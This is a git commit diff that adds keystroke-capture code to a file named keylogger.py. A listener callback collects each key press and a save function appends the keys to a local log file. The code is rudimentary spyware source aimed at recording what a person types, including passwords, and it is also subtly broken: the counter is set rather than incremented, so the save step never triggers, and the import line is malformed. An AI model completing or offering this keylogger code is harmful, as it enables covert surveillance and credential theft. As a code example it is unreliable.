f6955023bedea3487b1eb3f3f24a5bac30fb2dc3
Synter <alpacanismo@gmail.com>
2020-09-14 00:47:31 -0300

    Save and press commited

--- keylogger.py
+++ keylogger.py
@@ -4,3 +4,24 @@ import Key, Listener
 
 count = 0
 keys = []
+
+def press(key):
+    global keys, count
+    keys.append(key)
+    count = 1
+    print(key)
+    if count >= 10:
+        count = 0
+        save(keys)
+        keys = []
+        
+def save(keys):
+    with open("keylog.txt", "a") as file:
+        for key in keys:
+            _key = str(key).replace("'","")
+            if _key.find("space") > 0:
+                file.write("\n")
+            elif _key.find("key") == -1:
+                file.write(_key)
+                
+
